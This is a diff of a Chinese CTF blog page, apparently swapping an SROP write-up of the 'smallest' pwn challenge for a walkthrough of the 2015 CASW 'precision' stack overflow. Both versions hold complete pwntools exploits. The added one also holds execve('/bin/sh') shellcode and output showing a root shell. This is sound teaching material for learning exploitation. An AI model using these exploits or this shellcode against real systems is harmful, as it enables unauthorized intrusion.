@@ -4,24 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>360春秋杯smallest-pwn的学习与利用 | Reshahar的博客</title>
+    <title>2015-casw-precision-100解析 | Reshahar的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Reshahar">
     
 
     
-    <meta name="description" content="360春秋杯smallest-pwn的学习与利用">
-<meta name="keywords" content="pwn,stack-overflow,srop">
+    <meta name="description" content="一个非常简单的pwn栈溢出">
+<meta name="keywords" content="pwn,simple,stack-overflow">
 <meta property="og:type" content="article">
-<meta property="og:title" content="360春秋杯smallest-pwn的学习与利用">
-<meta property="og:url" content="http://Reshahar.github.io/2017/05/04/360春秋杯smallest-pwn的学习与利用/index.html">
+<meta property="og:title" content="2015-casw-precision-100解析">
+<meta property="og:url" content="http://Reshahar.github.io/2017/05/16/2015-casw-precision-100解析/index.html">
 <meta property="og:site_name" content="Reshahar的博客">
-<meta property="og:description" content="360春秋杯smallest-pwn的学习与利用">
-<meta property="og:updated_time" content="2017-05-06T08:40:07.000Z">
+<meta property="og:description" content="一个非常简单的pwn栈溢出">
+<meta property="og:updated_time" content="2017-05-18T14:50:46.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="360春秋杯smallest-pwn的学习与利用">
-<meta name="twitter:description" content="360春秋杯smallest-pwn的学习与利用">
+<meta name="twitter:title" content="2015-casw-precision-100解析">
+<meta name="twitter:description" content="一个非常简单的pwn栈溢出">
 
     
     <link rel="alternative" href="/atom.xml" title="Reshahar的博客" type="application/atom+xml">
@@ -82,14 +82,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/05/04/360春秋杯smallest-pwn的学习与利用/" title="360春秋杯smallest-pwn的学习与利用" itemprop="url">360春秋杯smallest-pwn的学习与利用</a>
+      <a href="/2017/05/16/2015-casw-precision-100解析/" title="2015-casw-precision-100解析" itemprop="url">2015-casw-precision-100解析</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/" title="Reshahar" target="_blank" itemprop="author">Reshahar</a>
 		
   <p class="article-time">
-    <time datetime="2017-05-04T12:17:21.000Z" itemprop="datePublished"> 发表于 2017-05-04</time>
+    <time datetime="2017-05-16T14:03:22.000Z" itemprop="datePublished"> 发表于 2017-05-16</time>
       
      &nbsp
      <span id="busuanzi_container_page_pv" style="display:none">
@@ -103,188 +103,187 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-srop原理"><span class="toc-number">3.</span> <span class="toc-text">0x02 srop原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04参考资料"><span class="toc-number">5.</span> <span class="toc-text">0x04参考资料</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00序"><span class="toc-number">1.</span> <span class="toc-text">0x00序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01漏洞定位与分析"><span class="toc-number">2.</span> <span class="toc-text">0x01漏洞定位与分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x02漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03总结"><span class="toc-number">4.</span> <span class="toc-text">0x03总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04参考"><span class="toc-number">5.</span> <span class="toc-text">0x04参考</span></a></li></ol>
 		
 		</div>
 		
-		<p>360春秋杯smallest-pwn的学习与利用</p>
+		<p>一个非常简单的pwn栈溢出</p>
 <hr>
 <a id="more"></a>
-<h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p>这是上个月的360春秋杯线上比赛中的一个pwn题，当时比赛的时候虽然漏洞非常明显，<br>但是还是没有任何思路去利用，后来看到wp后才了解到利用的方法，wp中介绍了思路没有exp，<br>我自己尝试着做了一遍，写了一个exp，作为pwn的新手，仅仅希望给新手一个帮助，也为自己做一个记录</p>
-<p>题目文件：<br><a href="https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest</a></p>
-<h3 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h3><p>首先将程序smallest放到ida中，很快就分析结束了，因为程序非常小，人如其名,具体如下：</p>
-<pre><code>.text:00000000004000B0 start           proc near
-.text:00000000004000B0                 xor     rax, rax
-.text:00000000004000B3                 mov     edx, 400h
-.text:00000000004000B8                 mov     rsi, rsp
-.text:00000000004000BB                 mov     rdi, rax
-.text:00000000004000BE                 syscall
-.text:00000000004000C0                 retn
-.text:00000000004000C0 start           endp
-</code></pre><p>很明显的栈溢出漏洞，缓冲区大小400h大小，足够大了，但是使用gdb（peda插件）查看保护属性</p>
+<h3 id="0x00序"><a href="#0x00序" class="headerlink" title="0x00序"></a>0x00序</h3><p>这是一个很简单的栈溢出，其中唯一的难题可能就是浮点数的存储的问题，这属于计算机组成原理的知识，整体来说还是很简单的。</p>
+<p>题目相关文件：<a href="https://github.com/Reshahar/BlogFile/tree/master/2015-casw-precision-100" target="_blank" rel="external">https://github.com/Reshahar/BlogFile/tree/master/2015-casw-precision-100</a></p>
+<h3 id="0x01漏洞定位与分析"><a href="#0x01漏洞定位与分析" class="headerlink" title="0x01漏洞定位与分析"></a>0x01漏洞定位与分析</h3><p>使用IDA+F5大法，程序的整体流程就出来了，直接可以定位漏洞的位置，就是char buf[128]这个缓冲区（为了使代码更符合C语言的语法，我简单对变量的类型名称进行了修改），这会造成一个栈溢出。</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+char buf[128]; // [sp+18h] [bp-88h]@1
+double d; // [sp+98h] [bp-8h]@1
+
+d = 64.33333;
+setvbuf(stdout, 0, 2, 0);
+printf(&quot;Buff: %p\n&quot;, buf);
+__isoc99_scanf(&quot;%s&quot;, buf);
+if ( 64.33333 != d )
+{
+    puts(&quot;Nope&quot;);
+    exit(1);
+}
+return printf(str, buf);
+}
+</code></pre><p>在linux系统中使用gdb查看安全机制，除了最后一个（看到这个选项部分开启，我也查了很多资料，但是后来利用的时候才发现和它没啥关系…经验不足啊），而其他的NX，PIE都没有开启，可以说简单很多。</p>
 <pre><code>gdb-peda$ checksec
 CANARY    : disabled
 FORTIFY   : disabled
-NX        : ENABLED
+NX        : disabled
 PIE       : disabled
-RELRO     : disabled
-</code></pre><p>可以看到开启了nx，所以不能直接植入shellcode，首先想到的就是rop，但是程序使用asm写的，没有任何的依赖库，根本找不到gadget</p>
-<h3 id="0x02-srop原理"><a href="#0x02-srop原理" class="headerlink" title="0x02 srop原理"></a>0x02 srop原理</h3><p>比赛的时候也就分析到上面这样，后来看到wp后才知道srop技术，下面简单讲解一下srop<br>首先说一下rop（返回导向编程），这是一种绕过nx的一种方法，简单来说就是在程序或者依赖库中寻找一些以ret结束的指令，这里我们叫他gadget，由这些gadget组成一个chain来执行某些功能，<br>srop的使用和rop相当相似，而且更简单，这里大家最好先去了解一下rop的原理和使用技巧，这里我就不再多说，重点是介绍srop<br>srop（Sigreturn Oriented Programming），其中的Sigreturn是一个系统调用，在linux中存在一种机制signal信号机制，在系统的很多情况下，存在应用层和内核层的交互，很多通过signal来实现。<br>如果内核向进程发送一个signal，会有如下过程：</p>
-<pre><code>1.这个进程会被挂起，进入内核
-2.内核保存程序的相应的上下文，调用signal handler
-3.signal handler结束后，内核恢复保存的相应的上下文
-4.进程继续执行
-</code></pre><p>这里有一个很关键的点，就是程序相应的上下文（进程挂起时的寄存器等等信息），而这些信息保存在栈上，并且内核在恢复的时候并没有相关的校验，也就是说我们可以更改，也就是说我们可以间接控制寄存器。</p>
-<p>下面在介绍一下这个上下文的结构（Signal frame）</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th style="text-align:center"></th>
-<th style="text-align:center"></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0x00</td>
-<td style="text-align:center">re_Sigreturn</td>
-<td style="text-align:center">uc_flags</td>
-</tr>
-<tr>
-<td>0x10</td>
-<td style="text-align:center">&amp;us</td>
-<td style="text-align:center">uc_stack.ss_sp</td>
-</tr>
-<tr>
-<td>0x20</td>
-<td style="text-align:center">uc_stack.ss_flags</td>
-<td style="text-align:center">uc_stack.ss_size</td>
-</tr>
-<tr>
-<td>0x30</td>
-<td style="text-align:center">r8</td>
-<td style="text-align:center">r9</td>
-</tr>
-<tr>
-<td>0x40</td>
-<td style="text-align:center">r10</td>
-<td style="text-align:center">r11</td>
-</tr>
-<tr>
-<td>0x50</td>
-<td style="text-align:center">r12</td>
-<td style="text-align:center">r13</td>
-</tr>
-<tr>
-<td>0x60</td>
-<td style="text-align:center">r14</td>
-<td style="text-align:center">r15</td>
-</tr>
-<tr>
-<td>0x70</td>
-<td style="text-align:center">rdi</td>
-<td style="text-align:center">rsi</td>
-</tr>
-<tr>
-<td>0x80</td>
-<td style="text-align:center">rbp</td>
-<td style="text-align:center">rbx</td>
-</tr>
-<tr>
-<td>0x90</td>
-<td style="text-align:center">rdx</td>
-<td style="text-align:center">rax</td>
-</tr>
-<tr>
-<td>0xA0</td>
-<td style="text-align:center">rcx</td>
-<td style="text-align:center">rsp</td>
-</tr>
-<tr>
-<td>0xB0</td>
-<td style="text-align:center">rip</td>
-<td style="text-align:center">rflags</td>
-</tr>
-<tr>
-<td>0xC0</td>
-<td style="text-align:center">cs/gs/fs</td>
-<td style="text-align:center">err</td>
-</tr>
-<tr>
-<td>0xD0</td>
-<td style="text-align:center">trapno</td>
-<td style="text-align:center">oldmask(unused)</td>
-</tr>
-<tr>
-<td>0xE0</td>
-<td style="text-align:center">cr2(segfalut_addr)</td>
-<td style="text-align:center">&amp;fpstate</td>
-</tr>
-<tr>
-<td>0xF0</td>
-<td style="text-align:center">__reserved</td>
-<td style="text-align:center">sigmask</td>
-</tr>
-</tbody>
-</table>
-<p>其中re_Sigreturn这是一个系统调用，它会将这个结构体数据恢复到相应寄存器中，我们可以替换rip的值来控制程序流程，也可以同时修改rsp的地址，使程序形成一个chian，从而通过srop实现更多的功能</p>
-<p>利用srop需要几个条件：</p>
-<pre><code>1.程序存在栈溢出漏洞
-2.知道栈地址或者可以知道需要使用字符串的地址等
-3.知道sigreturn的地址
-3.知道syscall的地址或者syscall gadget地址
-</code></pre><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><p>上面介绍了srop的原理，我们可以使用上面的原理来利用smallest这个pwn题<br>这个题满足上面的几个条件:</p>
-<pre><code>1.程序存在栈溢出
-2.栈地址可以通过调试获得
-3.syscall ret 地址我们明显知道
-</code></pre><p>唯一不满足的就是没有sigreturn的地址，因为这是一个系统调用，我们可以通过syscall来实现执行sigreturn，这样我们就需要控制rax的值，因为rax存储系统调用的调用号，<br>而rax的值也是用来存储返回值得，所以我们可以通过程序的功能来读取0xf个字符（0xf sigreturn的调用号），想到这里的时候当时我自己钻进牛角尖了，一直在考虑怎么布置好Signal frame，同时发0xf个字节，<br>想了好久，最后换了一个角度，很快就想明白了，我们可以发两个playload</p>
-<pre><code>1.设置好Signal frame，同时控制程序让它再读一次数据 
-2.设置rax的值
-</code></pre><p>我写的playload的具体结构如下：</p>
-<pre><code>playload1=&quot;rereadaddr&quot;+‘padd’*8+frame+&quot;/bin/sh&quot;
-playload2=&quot;syscalladdr&quot;+&apos;padd&apos;*7        长度0xf
-</code></pre><p>上面的playload中的一些数据，需要使用gdb调试获取：</p>
-<pre><code>1.&quot;/bin/sh&quot;的地址，将rdi设置成其地址这是函数的第一个参数
-2.设置rax为59（execve系统调用）
-3.设置rip 等于syacall地址
-</code></pre><p>完整exp如下：</p>
-<p>这里我使用了pwntools，这样会很迅速的写出exp</p>
-<pre><code>from pwn import *
+RELRO     : Partial
+</code></pre><p>使用gdb+peda中的pattern生成200个畸形字符串，然后运行程序，程序直接退出了</p>
+<pre><code>gdb-peda$ pattern create 200 1.txt
+Writing pattern of 200 chars to filename &quot;1.txt&quot;
+gdb-peda$ r &lt;1.txt
+Starting program: /root/D/stack overflow/2015-casw-precision-100/precision_a8f6f0590c177948fe06c76a1831e650 &lt;1.txt
+Buff: 0xffffd328
+Nope
+[Inferior 1 (process 9331) exited with code 01]
+Warning: not running or target is remote
+</code></pre><p>根据上面程序的输出，结合IDA结果，可以看到程序执行了另一条路，因为缓冲区溢出后会覆盖这个double类型的d变量，然后在覆盖到返回地址，而覆盖了d变量，程序就会直接退出，这和栈cookie（CANARY）差不多同一个原理，只不过cookie会变，它不会，我们直接从程序中获取到，或者自己编程获取都行</p>
+<pre><code>if ( 64.33333 != d )
+{
+    puts(&quot;Nope&quot;);
+    exit(1);
+}
+</code></pre><p>这里我写了一个程序获取double或者float变量的在内存中的存储情况，这个浮点数的存储是采用IEEE 754标准存储在内存中的，想要了解的更详细，可以谷歌查询，我写的代码如下，大家可以参考</p>
+<pre><code>//filename: double_or_float_in_mem.c
+//author:reshahar
+#include&lt;stdio.h&gt;
+void main()
+{
+    double dnum;
+    float fnum;
+    char *buf;
+    int i;
+    int chose;
+    while(1)
+    {
+        printf(&quot;Input 1 or 2 or 3 chose float or double or exit:&quot;);
+        scanf(&quot;%d&quot;,&amp;chose);
+        if(chose==1)
+        {
+            printf(&quot;Input a float:&quot;);
+            scanf(&quot;%f&quot;,&amp;fnum);
+            buf = ((char*)&amp;fnum);
+            printf(&quot;%f in memory is 0x&quot;,fnum);    
+            for(i=0;i&lt;4;i++)
+            {
+                printf(&quot;%2x&quot;,(unsigned char)buf[i]);
+            }
+            printf(&quot;\n&quot;);
+        }else if(chose==2)
+        {
+            printf(&quot;Input a double:&quot;);
+            scanf(&quot;%lf&quot;,&amp;dnum);
+            buf = ((char*)&amp;dnum);
+            printf(&quot;%lf in memory is 0x&quot;,dnum);    
+            for(i=0;i&lt;8;i++)
+            {
+                printf(&quot;%2x&quot;,(unsigned char)buf[i]);
+            }
+            printf(&quot;\n&quot;);
+        }else if(chose==3)
+        {
+            break;
+        }
+        else
+        {
+            printf(&quot;Input Error Chose!\n&quot;);
+        }
+    }       
+}
+</code></pre><p>编译运行如下</p>
+<pre><code>root@kali:~/D/stack overflow/2015-casw-precision-100# gcc double_or_float_in_mem.c -m32  -o double_or_float_in_mem
+root@kali:~/D/stack overflow/2015-casw-precision-100# ./double_or_float_in_mem
+Input 1 or 2 or 3 chose float or double or exit:2
+Input a double:64.33333
+64.333330 in memory is 0xa5315a4755155040
+Input 1 or 2 or 3 chose float or double or exit:
+</code></pre><p>这里直接就获取到64.33333内存中的存储情况，然后在次生成一个畸形字符串如下</p>
+<pre><code>#python
+double = &apos;a5315a4755155040&apos;
+playload = &apos;A&apos;*0x80+binascii.a2b_hex(double)+&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&apos;
+f = open(&apos;1&apos;,&apos;wb&apos;)
+f.write(playload)
 
-p = process(&apos;./smallest&apos;)
+其中0x80（128）是缓冲区的大小，紧接着就是double变量，后边的畸形字符串是为了确定返回地址的位置
+</code></pre><p>使用gdb调试，运行并输入畸形字符文件1，可以看到程序断下来了，通过pattern获取到了偏移是12</p>
+<pre><code>0x6e414124 in ?? ()
+gdb-peda$ pattern offset 0x6e414124
+1849770276 found at offset: 12
+</code></pre><p>调试的工作基本结束了</p>
+<h3 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h3><p>在没有开启NX的情况下，直接把shellcode放到栈上就行了，而要让shellcode正常运行，那么就首先要有个shellcode，这里大家可以自己去网上找一个或者使用kali 2.0的msfvenom或者kali 1.x 版本的msfpayload生成一个，当然为了锻炼自己的能力，那就是自己将下面的汇编转换成机器码，这里因为漏洞函数不能出现\x00\x0b等bad char，这里要注意一下</p>
+<pre><code>#execve(&apos;/bin/sh&apos;)
 
-reread = 0x4000b0
-syscall = 0x4000be
+# xor ecx,ecx
+# push ecx
+# push 0x68732f2f ;; hs//
+# push 0x6e69622f ;; nib/
+# mov ebx,esp
+# mov al,15
+# sub eax,4     &quot;\x0b&quot; bad char
+# int 0x80
 
-rereadaddr = p64(reread)
-syscalladdr = p64(syscall)
+#结果
+shell=&quot;\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0f\x83\xe8\x04\xcd\x80&quot; 
+</code></pre><p>shellcode已经有了，然后既然要在栈上执行，要把程序程序劫持到我们的shellcode上来执行，那么就需要知道缓冲区的起始地址，这个程序也给出了，它会打印出缓冲区buf的起始位置，放置好shellcode，直接跳过去就行了</p>
+<p>完整的exp如下</p>
+<pre><code>#filename:exp.py
+#author:reshahar
+from pwn import *
+import binascii
 
-context.clear()
-context.arch = &quot;amd64&quot;
+p = process(&apos;./precision_a8f6f0590c177948fe06c76a1831e650&apos;)
 
-frame = SigreturnFrame()
-frame.rax = 59
-frame.rdi = 0x7fffffffe4e8
-frame.rip = syscall
+#execve(&apos;/bin/sh&apos;)
 
-print &apos;###rereadaddr&apos;+rereadaddr +&apos;###&apos;
-print &apos;###syscalladdr&apos;+syscalladdr +&apos;###&apos;
+# xor ecx,ecx
+# push ecx
+# push 0x68732f2f ;; hs//
+# push 0x6e69622f ;; nib/
+# mov ebx,esp
+# mov al,15
+# sub eax,4     &quot;\x0b&quot; bad char
+# int 0x80
 
-binsh=&apos;/bin/sh&apos; 
+shell=&quot;\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0f\x83\xe8\x04\xcd\x80&quot; 
 
-print &apos;###send playload1####&apos;
+p.recvuntil(&apos;Buff: &apos;)
+jmp = p.recv(10)
+jmp = int(jmp,16)
 
-playload1 = rereadaddr+&apos;a&apos;*8+ str(frame)+binsh
-p.send(playload1)
+print &apos;jmp addr&apos;+p32(jmp)
 
-print &apos;###send playload2####&apos;
+double = &apos;a5315a4755155040&apos;
 
-playload2 = syscalladdr+&apos;a&apos;*7
+#playload = &apos;A&apos;*0x80+binascii.a2b_hex(double)+&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&apos;
 
-p.send(playload2)
+# f = open(&apos;1&apos;,&apos;wb&apos;)
+# f.write(playload)
+
+playload = shell+&apos;A&apos;*(0x80-len(shell))+binascii.a2b_hex(double)+&apos;C&apos;*12+p32(jmp)
+
+p.sendline(playload)
 
 p.interactive()
-</code></pre><h3 id="0x04参考资料"><a href="#0x04参考资料" class="headerlink" title="0x04参考资料"></a>0x04参考资料</h3><p>[1]:<a href="http://www.2cto.com/article/201512/452080.html" target="_blank" rel="external">http://www.2cto.com/article/201512/452080.html</a>     Sigreturn Oriented Programming (SROP) Attack攻击原理<br>[2]:<a href="https://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/" target="_blank" rel="external">https://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/</a>  Playing with signals : An overview on Sigreturn Oriented Programming</p>
+</code></pre><p>运行结果如下，getshell</p>
+<pre><code>root@kali:~/D/stack overflow/2015-casw-precision-100# python exp.py 
+[+] Starting local process &apos;./precision_a8f6f0590c177948fe06c76a1831e650&apos;: pid 9568
+jmp addrx��\xff
+[*] Switching to interactive mode
+
+Got 1�Qh//shh/bin\x89��\x83��\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa51ZGU\x15P@CCCCCCCCCCCCx��\xff
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ 
+</code></pre><h3 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h3><pre><code>pwn这类的题经验还是很重要的，有的时候会事半功倍，而只有多做题才能增加自己的经验。
+</code></pre><h3 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h3><p>[1]:<a href="http://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html</a> 浮点数的二进制表示<br>[2]:<a href="http://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="external">http://blog.csdn.net/xiaominthere/article/details/17287965</a> Linux系统调用 int 80h int 0x80<br>[3]:<a href="http://www.evil0x.com/posts/9492.html" target="_blank" rel="external">http://www.evil0x.com/posts/9492.html</a> kali2.0 : msfpayload和msfencode的集成版msfvenom 使用简介</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -298,7 +297,7 @@ p.interactive()
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/stack-overflow/">stack-overflow</a><a href="/tags/srop/">srop</a>
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/simple/">simple</a><a href="/tags/stack-overflow/">stack-overflow</a>
   </div>
 
 </div>
@@ -307,7 +306,7 @@ p.interactive()
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://Reshahar.github.io/2017/05/04/360春秋杯smallest-pwn的学习与利用/" data-title="360春秋杯smallest-pwn的学习与利用 | Reshahar的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://Reshahar.github.io/2017/05/16/2015-casw-precision-100解析/" data-title="2015-casw-precision-100解析 | Reshahar的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -321,21 +320,13 @@ p.interactive()
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/04/17/python-django-简单总结/" title="python django 简单总结">
+ <a href="/2017/05/10/2015-defcon-quals-r0pbaby解析/" title="2015-defcon-quals-r0pbaby解析">
   <strong>上一篇：</strong><br/>
   <span>
-  python django 简单总结</span>
+  2015-defcon-quals-r0pbaby解析</span>
 </a>
 </div>
 
-
-<div class="next">
-<a href="/2017/05/10/2015-defcon-quals-r0pbaby解析/"  title="2015-defcon-quals-r0pbaby解析">
- <strong>下一篇：</strong><br/> 
- <span>2015-defcon-quals-r0pbaby解析
-</span>
-</a>
-</div>
 
 </nav>
 
@@ -347,7 +338,7 @@ p.interactive()
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-srop原理"><span class="toc-number">3.</span> <span class="toc-text">0x02 srop原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04参考资料"><span class="toc-number">5.</span> <span class="toc-text">0x04参考资料</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00序"><span class="toc-number">1.</span> <span class="toc-text">0x00序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01漏洞定位与分析"><span class="toc-number">2.</span> <span class="toc-text">0x01漏洞定位与分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x02漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03总结"><span class="toc-number">4.</span> <span class="toc-text">0x03总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04参考"><span class="toc-number">5.</span> <span class="toc-text">0x04参考</span></a></li></ol>
  
   </div>
 
